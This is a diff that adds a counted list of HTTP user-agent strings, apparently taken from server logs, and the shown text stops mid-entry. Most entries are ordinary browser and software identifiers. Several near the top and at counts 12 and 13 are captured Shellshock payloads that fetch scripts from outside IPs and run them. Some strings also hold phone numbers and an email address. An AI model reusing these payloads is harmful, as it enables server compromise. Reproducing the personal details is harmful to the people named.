@@ -1,0 +1,725 @@
+1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://185.70.10.139/mk2;curl -O http://185.70.10.139/mk2;wget http://185.70.10.139/mk2;perl mk2;perl /tmp/mk2;rm -rf /tmp/mk2*"
+1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.131.4.153/dx3;curl -O http://31.131.4.153/dx3;wget http://31.131.4.153/dx3;perl /tmp/dx3*;perl dx3;rm -rf /tmp/dx3*"
+1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.220.3.180/j.sec;curl -O http://31.220.3.180/j.sec;wget http://31.220.3.180/j.sec;perl /tmp/j.sec*;perl j.sec;rm -rf /tmp/j.sec*"
+1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.220.3.180/led.sec;curl -O http://31.220.3.180/led.sec;wget http://31.220.3.180/led.sec;perl /tmp/led.sec*;perl led.sec;rm -rf /tmp/led.sec*"
+1;() { :;}; /bin/bash -c "wget http://82.118.236.241/functions"
+1;1.7.3-B/267511/5.1
+1;1.7.3-B/267829/5.0
+1;67_1stlaunch_monster
+1;BingBar 7.0.610.0
+1;Borland Delphi 60
+1;Charlie Hebdo
+1;Cloud mapping experiment searching for shoutcast servers. Contact research@pdrlabs.net
+1;Cloud mapping experiment. Contact research@pdrlabs.net
+1;compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html
+1;CountInstallation
+1;Docudesk_Agent
+1;FoxitCloud
+1;GMon/0.0.1
+1;Go http package
+1;Go-http-client/1.1
+1;gzip
+1;HTTP_Request2/0.5.2 (http://pear.php.net/package/http_request2) PHP/5.2.6-1+lenny9
+1;HTTP_Request2/0.5.2 (http://pear.php.net/package/http_request2) PHP/5.5.9-1ubuntu4.14
+1;HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.3.16
+1;HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.4.16
+1;HttpClient
+1;jucheck
+1;libcurl-agent/1.0
+1;libwww-perl/6.13
+1;lwp-request/6.03 libwww-perl/6.08
+1;Microsoft URL Control - 6.01.9782
+1;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)
+1;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+1;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+1;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+1;Mozilla/4.0 (compatible; qip4301; QSI13; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI14; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI2; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI5; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI6; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI8; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4301; QSI9; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+1;Mozilla/4.0 (compatible; qip4983; params )
+1;Mozilla/4.0 (compatible; qip4983; QSI10; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI14; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI15; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI19; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI20; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI21; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI27; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI29; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI32; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI33; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI37; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI39; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI54; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI57; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI62; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip4983; QSI67; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+1;Mozilla/4.0 (compatible; qip6936)
+1;Mozilla/4.0 (compatible; qip7000; params )
+1;Mozilla/4.0 (compatible; qip8092; Windows NT 6.0; ID:1e9f30154e24aa3c84409e3d44dab708)
+1;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; params)
+1;Mozilla/4.0 (compatible; Win32)
+1;Mozilla/5.0 (compatible; Konqueror/2.2.2; Linux 2.4.14-xfs; X11; i686)
+1;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+1;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+1;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+1;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+1;Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0
+1;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+1;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
+1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
+1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/42.0
+1;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+1;Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0
+1;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
+1;Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
+1;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+1;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040413 Epiphany/1.2.1
+1;NSIS
+1;OfferCast3
+1;OpenOffice 4.1.2 (412m3(Build:9782); Windows; x86; BundledLanguages=ru)
+1;Opera NetInstaller/35.0.2066.37
+1;Opera/7.21 (Windows NT 5.1; U)
+1;Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16
+1;Paragon NTFS for Mac/12.2.313 Sparkle/1.5
+1;Paragon Promo/1 Sparkle/1.5
+1;PowerRegister
+1;python-requests/2.1.0 CPython/2.7.6 Linux/3.19.0-31-generic
+1;python-requests/2.2.1 CPython/2.7.6 Linux/2.6.32-042stab092.1
+1;python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-686-pae
+1;python-requests/2.8.0
+1;python-requests/2.9.1
+1;Python-urllib/1.17
+1;Python-urllib/2.6
+1;server-bag [Mac OS X,10.9.5,13F1507,MacBookAir6,2]
+1;Skype� 7.16
+1;StatisticsEx/2.0
+1;Syncer/5.00 (unknown)
+1;Total Network Monitor 2
+1;unused/0 (m2note LMY47D); gzip
+1;VEhMIFcyMDA7MTc7NC4yLjE7VEhMLUNOLTlCMThELVAxODhGMDRWMS4xLjE7MzUzNzQ2MDIxMDkzNzEyOzI1MDIwMzMxMjkyODU4MztudWxsOztudWxsO251bGw7O251bGw7bnVsbDtjb20ubW9iaWxldW5jbGUudG9vbGJveDozMjc6QVJlY2VpdmVyOklBOzE7VEVMRTI=
+1;Wget/1.16.3 (linux-gnu)
+1;Windows-Media-Player/10.00.00.3997
+1;WLInstaller/2.0
+10;AccessPoint/3.36.0 (e556c)
+10;Dr.Web anti-virus Light Version: 9.00.2.14001 Device model: Lenovo A328 Firmware version: 4.4.2
+10;Kaspersky Downloader
+10;M44-toolbox/20130809v2.9.5;THL;THL W200;17;4.2.1;THL-CN-9B18D-P188F04V1.1.1
+10;Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)
+10;Mozilla/4.0 (compatible; qip8082; Windows NT 5.1; ID:9021a6147d1c0cb5d6009c88ca8d9464)
+10;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+10;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
+10;unused/0 (delos3geur JZO54K); gzip
+100;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
+100;APNU
+1000328;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+100136;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
+102;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+102;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
+102;R26JY69RPL.com.vk.vkclient
+1021;SDK 1.5
+103;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
+103;MpCommunication
+10408;1C+Enterprise/8.3
+105;Mozilla/4.0 (compatible; qip4301; Windows NT 6.1)
+105;Mozilla/5.0 (compatible; IE 11.0; Win32; Trident/7.0)
+10569;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47 (Edition Yx)
+106260;-
+1065;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+107;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Excel 11.0.8202; Pro)
+108;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
+11;apache
+11;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1)
+11;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88
+11;Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7
+11;NSPlayer/11.0.5721.5251
+11;Telesphoreo
+11;unused/0 (hammerhead MHC19J); gzip
+11;Windows-Media-Player/11.0.5721.5293
+110;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+1103;MRAICQ 8.3 (build 7317) +79627054326 icq
+111;Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.15
+113;SilentUpdate
+11447;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E)
+115;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; AskTbFXTV5/5.9.1.14019)
+115230;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.1.6475 Safari/537.36
+118;Chrome WIN 48.0.2564.97 (97d2b858fc7c3d480a52f4b58ed72c76fa535598-refs/branch-heads/2564@{#631}) channel(stable)
+118;MSDW
+119;Skype WISPr
+12;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system(" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  ");'
+12;Apache-HttpClient/4.4.1 (Java/1.8.0_60)
+12;HTC Streaming Player htc_europe / 1.0 / htc_primou / 4.0.3
+12;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+12;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.2.0
+12;unused/0 (gtel3g KTU84P); gzip
+12;WATClient
+1205;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)
+1206533;SeaPort/3.1
+121;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E; IDCRL 6.500.3165.0; IDCRL-cfg 6.500.12320.0; IDCRL-ui 6.500.3165.0; App WLIDSVC.EXE, 6.500.3165.0, {DF60E2DF-88AD-4526-AE21-83D130EF0F68})
+122;Chrome WIN 48.0.2564.103 (cc2c23a615e1c898bc58b1fb818c41f214f509d8-refs/branch-heads/2564@{#657}) channel(stable)
+12261;FULLSTUFF
+1232;Agoo-sdk-2.0
+1240;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
+1249;McHttpH
+1277;Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
+12860;Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0
+129;2gis/1.0.0.5247 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
+1294;MICROSOFT_DEVICE_METADATA_RETRIEVAL_CLIENT
+13;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'
+13;CppAnalytics
+13;Google Update/1.3.29.1;winhttp;cup-ecdsa
+13;Mozilla/4.0 (compatible; MSIE 9.11.9600.18015; Windows NT 6.1)
+13;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+130;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88 (Edition Campaign 67)
+131;WinINet HttpStack/14
+134;Chrome WIN 47.0.2526.106 (19b9e1a5713f4b9ae324bd59bbe16ca6eb91d0e0-refs/branch-heads/2526@{#532}) channel(stable)
+135;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2
+1353;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
+137485;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+139;2gis/3.16.3.5247 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
+14;CPCrypto
+14;Mozilla/4.0 (CCleaner, 5.06.5219)
+14;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
+145;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
+14523;MRAICQ 8.2 (build 7046) 640530270 icq
+149857;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+15;HPWinMars550
+15;Mordo Online updater 1.0
+15;Mozilla/5.0 (Windows NT 5.2; rv:30.0) Gecko/20100101 Firefox/30.0
+15;Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+15;SonyEricssonPCCompanion/2.10.303
+15;unused/0 (ASUS_T00J KVT49L); gzip
+151;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+154;Chrome WIN 49.0.2623.87 (d177478d466b84ab06f0f48081fc30e3b04be6ca-refs/branch-heads/2623@{#592}) channel(stable)
+15593;MRAICQ 8.3 (build 7317) +79111977193 icq
+157;GameXPService/1.4.0 (d7ea0)
+159293;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+16;gSOAP/2.7
+16;install traffic
+16;Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
+16;MRAICQ 8.3 (build 7317) rinakamelia@rambler.ru icq
+16066;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+16331;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
+165;SP_Connector
+166;CMTalkerSDK.0.0.1
+167;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; AskTbFXTV5/5.9.1.14019)
+17;AlterGeoUpdater/3.5.4
+17;AMPVConnector
+17;com.mxtech.videoplayer.ad/86
+17;Google-HTTP-Java-Client/1.12.0-beta (gzip)
+17;Microsoft Office Protocol Discovery
+17;netscan
+17;unused/0 (g2 LRX22G); gzip
+170;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2)
+170;Wget/1.13.4 (linux-gnueabi)
+17202;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36
+17260;MRAICQ 8.2 (build 7067) 686888390 icq
+173;WinINet HttpStack/11
+1738;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+17907;MRAICQ 8.3 (build 7317) 676962764 icq
+18;CaptiveNetworkSupport-325.10.1 wispr
+18;DVGet
+18;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.4.2403.3 Amigo/44.4.2403.3 MRCHROME SOC Safari/537.36 CHANNEL_789104
+18;Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0
+18;Windows-Media-Player/12.0.7601.18840
+181;okhttp/2.2.0
+181;QGUpdater 1.0
+186;Foxit Reader
+1864;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+1878;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E)
+188;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
+19;BTWebClient/3450(41162)
+19;CaptiveNetworkSupport-277.10.5 wispr
+19;GoogleEarth
+19;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+19;Mozilla/4.0 (Windows 7 6.1) Java/1.8.0_66
+19;Mozilla/5.0 (compatible; MSIE 5.01; Win2000)
+19;unused/0 (hammerhead MMB29T); gzip
+1956;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; BRI/2)
+196;Mozilla/4.0 (compatible; MSIE 9.11.9600.18204; Windows NT 6.1)
+197412;2gis/3.15.10.4952 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
+2;__DownLoadWebFile__
+2;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 24898dda-b275-4dea-b28a-10be83f7b9e5
+2;Agent
+2;Amigo Setup
+2;AntiMalware Agent
+2;avast! SimpleHTTP
+2;DownloadFile
+2;Dr.Web Light Version: 9.00.5.14004 Device model: W200 Firmware version: 4.2.1
+2;EpsonRewardInvitation
+2;Foxit Updater
+2;Google Update/1.3.28.15;winhttp
+2;Google Update/1.3.29.2;winhttp
+2;Google Update/1.3.29.5;winhttp;cup-ecdsa
+2;Googlebot/2.1
+2;HelpSupportServices
+2;Microsoft Data Access Internet Publishing Provider Protocol Discovery
+2;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Excel 11.0.8405; Pro)
+2;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Office Outlook 11.0.8172; Pro)
+2;Microsoft Office/12.0 (Windows NT 5.1; Microsoft Office Excel 12.0.6607; Pro)
+2;Microsoft(r) Windows(tm) FTP Folder
+2;Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.3655)
+2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; MSOffice 12)
+2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.1; .NET CLR 2.0.50727)
+2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; NP06; GWX:DOWNLOADED)
+2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; BRI/2; NP06)
+2;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; IDCRL 10.6.3.9651.0; IDCRL-cfg 16.0.25710.0; App svchost.exe, 6.3.9651.0, {DF60E2DF-88AD-4526-AE21-83D130EF0F68})
+2;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+2;Mozilla/4.0 (compatible; qip4301; QI; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+2;Mozilla/4.0 (compatible; qip4301; QSI10; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+2;Mozilla/4.0 (compatible; qip4301; QSI3; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+2;Mozilla/4.0 (compatible; qip4301; QSI7; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+2;Mozilla/4.0 (compatible; qip4983; QSI18; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI22; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI25; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI28; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI3; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI35; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI43; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI5; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; qip4983; QSI7; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+2;Mozilla/4.0 (compatible; Synapse)
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4
+2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko)
